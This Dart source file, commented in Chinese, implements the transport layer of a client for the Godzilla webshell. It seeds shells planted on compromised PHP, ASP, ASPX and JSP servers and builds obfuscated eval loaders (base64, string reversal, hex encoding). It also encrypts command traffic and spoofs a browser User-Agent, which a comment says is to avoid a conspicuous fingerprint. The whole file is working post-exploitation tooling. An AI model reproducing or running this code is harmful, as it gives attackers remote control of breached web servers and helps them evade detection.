import 'dart:async';
import 'dart:convert';
import 'dart:typed_data';

import 'package:http/http.dart' as http;

import '../../core/asset_loader.dart';
import '../../core/crypto/godzilla_codec.dart';
import '../../core/crypto/godzilla_crypto.dart';
import 'godzilla_variant.dart';

class GodzillaProtocolException implements Exception {
  GodzillaProtocolException(this.message);
  final String message;
  @override
  String toString() => message;
}

class GodzillaSeedException implements Exception {
  GodzillaSeedException(this.message);
  final String message;
  @override
  String toString() => message;
}

/// 一次 Godzilla 调用的完整传输：Cookie、播种、gzip、加解密、重试。
///
/// 与 Behinder 连接器一样，所有请求串行化（Session 型 shell 并发会互相干扰）。
class GodzillaTransport {
  GodzillaTransport({
    required this.url,
    required this.password,
    required this.secretKey,
    required this.variant,
    required this.engineLoader,
    this.timeout = const Duration(seconds: 25),
  }) : _key16 = GodzillaCrypto.deriveKey16(secretKey);

  final String url;
  final String password;
  final String secretKey;
  final GodzillaVariant variant;
  final Future<Uint8List?> Function() engineLoader;
  final Duration timeout;

  final String _key16;
  final http.Client _client = http.Client();
  final Map<String, String> _cookies = {};

  bool _seeded = false;
  bool _engineMissing = false;
  String? _evalContent;
  String? _asmxRequest;
  String? _csharpEvalContent;
  String? _aspEvalChopper;
  Future<void>? _seedInFlight;
  Future<void> _gate = Future.value();

  String? lastError;
  int? lastHttpStatus;
  int? lastResponseBytes;

  String get key16 => _key16;

  /// ASP_EVAL 的标记 key 是上游的双重哈希。
  String get _markerKey16 => variant.markerKeyUsesDoubleHash
      ? GodzillaCrypto.md5Hex(_key16).substring(0, 16)
      : _key16;

  /// 本地是否缺少目标端引擎资产（ASPX 在未编译 DLL 时为 true）。
  bool get engineMissing => _engineMissing;

  /// 串行执行，避免 PHP `session_start` 锁 / JSP Session 竞态。
  Future<T> _serialized<T>(Future<T> Function() action) {
    final previous = _gate;
    final completer = Completer<void>();
    _gate = completer.future;
    return previous.then((_) => action()).whenComplete(completer.complete);
  }

  Future<void> ensureSeeded() {
    if (_seeded) return Future.value();
    final inFlight = _seedInFlight;
    if (inFlight != null) return inFlight;
    final future = _doSeed();
    _seedInFlight = future;
    return future.whenComplete(() => _seedInFlight = null);
  }

  /// 构造 `PHP_EVAL_XOR_BASE64` 之类变体每次请求都要带的装载器表达式。
  Future<void> _prepareEvalContent() async {
    if (_evalContent != null) return;
    final asset = variant.evalLoaderAsset;
    if (asset == null) {
      throw GodzillaSeedException(
        '${variant.connectorType} 缺少装载器模板（evalLoaderAsset）',
      );
    }
    var body = await loadAssetString(asset);
    if (body.startsWith('<?php')) {
      body = body.substring('<?php'.length);
    }
    // 装载器的“密码”是 secretKey：数据参数名 = secretKey。
    body = body
        .replaceAll('{{PASS}}', _escapeSingleQuoted(secretKey))
        .replaceAll('{{KEY16}}', _key16);
    final reversed = base64.encode(utf8.encode(body)).split('').reversed.join();
    _evalContent =
        "eval(base64_decode(strrev(urldecode('${Uri.encodeComponent(reversed)}'))));";
  }

  static String _escapeSingleQuoted(String value) =>
      value.replaceAll(r'\', r'\\').replaceAll("'", r"\'");

  /// 加载/生成 asmx、C# eval、ASP eval 的请求模板。
  ///
  /// 模板来自 Godzilla 上游，保持原样（占位符不重命名），
  /// 以便和原版 Cryption 的字节输出逐字节对照。
  Future<void> _prepareWireAssets() async {
    switch (variant.wire) {
      case GodzillaWire.asmxBase64:
        if (_asmxRequest == null) {
          final tpl = await loadAssetString(variant.requestTemplateAsset!);
          _asmxRequest = tpl.replaceAll('{pass}', password);
        }
      case GodzillaWire.csharpEval:
        if (_csharpEvalContent == null) {
          final tpl = await loadAssetString(variant.evalLoaderAsset!);
          final code = tpl
              .replaceAll('{secretKey}', _key16)
              .replaceAll('{pass}', secretKey);
          final b64 = base64.encode(utf8.encode(code));
          final inner =
              "eval(System.Text.Encoding.Default.GetString("
              "System.Convert.FromBase64String(HttpUtility.UrlDecode("
              "'${_javaUrlEncode(b64)}'))),'unsafe');";
          // 原版对整段表达式再做一次 URLEncoder。
          _csharpEvalContent = _javaUrlEncode(inner);
        }
      case GodzillaWire.aspEval:
        if (_aspEvalChopper == null) {
          final markerKey16 = _markerKey16;
          final markers = GodzillaCrypto.markers(
            password: secretKey,
            key16: markerKey16,
            style: GodzillaMarkerStyle.lowerAsp6,
          );
          var loader = await loadAssetString(variant.aspEvalLoaderAsset!);
          loader = loader
              .replaceAll('{pass}', secretKey)
              .replaceAll('{secretKey}', markerKey16)
              .replaceAll('{findStrLeft}', markers.left)
              .replaceAll('{findStrRight}', markers.right);
          // 原版去掉 <% %> 后再转十六进制。
          loader = loader.replaceAll('<%', '').replaceAll('%>', '');
          final hex = utf8
              .encode(loader)
              .map((b) => b.toRadixString(16).padLeft(2, '0'))
              .join();
          final request = await loadAssetString(variant.aspEvalRequestAsset!);
          _aspEvalChopper = _javaUrlEncode(
            request.replaceAll('{hexCode}', hex),
          );
        }
      default:
        break;
    }
  }

  /// Java `URLEncoder.encode` 的逐字节等价实现。
  static String _javaUrlEncode(String value) {
    final buffer = StringBuffer();
    for (final b in utf8.encode(value)) {
      final safe =
          (b >= 0x30 && b <= 0x39) ||
          (b >= 0x41 && b <= 0x5A) ||
          (b >= 0x61 && b <= 0x7A) ||
          b == 0x2E ||
          b == 0x2D ||
          b == 0x2A ||
          b == 0x5F;
      if (safe) {
        buffer.writeCharCode(b);
      } else if (b == 0x20) {
        buffer.write('+');
      } else {
        buffer.write('%${b.toRadixString(16).padLeft(2, '0').toUpperCase()}');
      }
    }
    return buffer.toString();
  }

  Future<void> _doSeed() async {
    await _prepareWireAssets();
    if (variant.wire == GodzillaWire.evalBase64) {
      await _prepareEvalContent();
    }
    final engine = await engineLoader();
    if (engine == null || engine.isEmpty) {
      // 没有引擎资产时仍允许连接“已经被 Godzilla 播种过”的 Session。
      // 首次调用失败时，诊断信息会明确指出缺失的资产路径。
      _engineMissing = true;
      _seeded = true;
      return;
    }
    _engineMissing = false;
    final body = _buildBody(engine, gzip: false);
    await _post(body);
    if (lastHttpStatus != null && lastHttpStatus != 200) {
      throw GodzillaSeedException(
        lastError ?? 'seed failed with HTTP $lastHttpStatus',
      );
    }
    _seeded = true;
  }

  Future<Uint8List> call(Map<String, List<int>> params) {
    return _serialized(() async {
      await ensureSeeded();
      if (variant.wire == GodzillaWire.evalBase64) {
        await _prepareEvalContent();
      }
      final raw = GodzillaCodec.encodeParams(params);
      final payload = variant.gzipRequest ? GodzillaCodec.gzip(raw) : raw;
      final body = _buildBody(payload, gzip: false);

      var out = await _send(body);
      if (out != null) return out;

      // 第一次失败：可能是 Session 尚未稳定，重试一次。
      out = await _send(body);
      if (out != null) return out;

      // 第二次失败：重新播种后再试一次（Session 过期 / 服务端重启）。
      _seeded = false;
      await ensureSeeded();
      out = await _send(body);
      if (out != null) return out;

      final missing = _engineMissing
          ? '；本地缺少目标端引擎资产 ${variant.engineAsset}，'
                '只能连接已被其他 Godzilla 客户端播种过的 Session'
          : '';
      throw GodzillaProtocolException(
        '${lastError ?? 'empty response (check password/secretKey/variant)'}'
        '$missing',
      );
    });
  }

  Future<Uint8List?> _send(Uint8List body) async {
    final response = await _post(body);
    if (response.isEmpty) {
      lastError ??= 'empty response body';
      return null;
    }
    final markerPassword = variant.markerUsesSecretKey
        ? secretKey
        : (variant.markerPassword ?? password);
    final out = GodzillaCrypto.extractResponse(
      rawBody: response,
      password: markerPassword,
      key16: _markerKey16,
      variant: variant,
    );
    if (out == null) {
      lastError = variant.wire == GodzillaWire.raw
          ? '[Decrypt] raw response could not be decrypted '
                '(HTTP $lastHttpStatus, ${response.length} bytes): '
                '${_snippet(response)}'
          : '[Markers] response markers not found (HTTP $lastHttpStatus, '
                '${response.length} bytes): ${_snippet(response)}';
    }
    return out;
  }

  Uint8List _buildBody(Uint8List plain, {required bool gzip}) {
    final data = gzip ? GodzillaCodec.gzip(plain) : plain;
    final cipher = GodzillaCrypto.encrypt(data, _key16, variant.cipher);
    switch (variant.wire) {
      case GodzillaWire.raw:
        return cipher;
      case GodzillaWire.asmxBase64:
        final encoded = _javaUrlEncode(base64.encode(cipher));
        return utf8.encode(_asmxRequest!.replaceAll('{data}', encoded));
      case GodzillaWire.csharpEval:
        final encoded = _javaUrlEncode(base64.encode(cipher));
        return utf8.encode(
          '$password=$_csharpEvalContent'
          '&$secretKey=$encoded',
        );
      case GodzillaWire.aspEval:
        final encoded = _javaUrlEncode(base64.encode(cipher));
        return utf8.encode(
          '$password=$_aspEvalChopper'
          '&$secretKey=$encoded',
        );
      case GodzillaWire.evalBase64:
        final encoded = Uri.encodeComponent(base64.encode(cipher));
        final loader = Uri.encodeComponent(_evalContent!);
        // 固定、非敏感的数据参数名；secretKey 不再出现在报文里。
        return utf8.encode(
          '${Uri.encodeComponent(password)}=$loader&mxdata=$encoded',
        );
      case GodzillaWire.formBase64:
        final encoded = Uri.encodeComponent(base64.encode(cipher));
        return utf8.encode('${Uri.encodeComponent(password)}=$encoded');
    }
  }

  static const _userAgent =
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
      '(KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36';

  String get _contentType {
    if (variant.wire == GodzillaWire.raw) {
      return 'application/octet-stream';
    }
    if (variant.wire == GodzillaWire.asmxBase64) {
      return 'text/xml; charset=utf-8';
    }
    return 'application/x-www-form-urlencoded';
  }

  Future<Uint8List> _post(Uint8List body) async {
    lastError = null;
    final uri = Uri.parse(url);
    final headers = <String, String>{
      'Content-Type': _contentType,
      // 原版用 Java/17 的 UA，Dart 默认会是 `Dart/3.x (dart:io)`——
      // 后者是一个很显眼的指纹，这里统一用浏览器 UA（与 Behinder 连接器一致）。
      'User-Agent': _userAgent,
      'Accept': 'text/html, image/gif, image/jpeg, */*; q=0.2',
      if (variant.wire == GodzillaWire.asmxBase64)
        'SOAPAction': '"http://tempuri.org/$password"',
      if (_cookies.isNotEmpty)
        'Cookie': _cookies.entries.map((e) => '${e.key}=${e.value}').join('; '),
    };
    try {
      final response = await _client
          .post(uri, headers: headers, body: body)
          .timeout(timeout);
      _updateCookies(response);
      lastHttpStatus = response.statusCode;
      lastResponseBytes = response.bodyBytes.length;
      if (response.statusCode != 200) {
        lastError =
            '[HTTP ${response.statusCode}] ${_snippet(response.bodyBytes)}';
        return Uint8List(0);
      }
      return response.bodyBytes;
    } on TimeoutException {
      lastError = '[Timeout] ${timeout.inSeconds}s';
      return Uint8List(0);
    } on http.ClientException catch (e) {
      lastError = '[Connection Error] ${e.message}';
      return Uint8List(0);
    } catch (e) {
      lastError = '[Error] $e';
      return Uint8List(0);
    }
  }

  void _updateCookies(http.Response response) {
    final raw = response.headers['set-cookie'];
    if (raw == null || raw.isEmpty) return;
    // 只取第一段；JSESSIONID / PHPSESSID 都在其中。
    final part = raw.split(';').first.trim();
    final eq = part.indexOf('=');
    if (eq > 0) {
      _cookies[part.substring(0, eq).trim()] = part.substring(eq + 1).trim();
    }
  }

  static String _snippet(Uint8List bytes) {
    final text = latin1.decode(
      bytes.length > 512 ? bytes.sublist(0, 512) : bytes,
      allowInvalid: true,
    );
    return text.replaceAll(RegExp(r'\s+'), ' ').trim();
  }

  void close() {
    _client.close();
  }
}
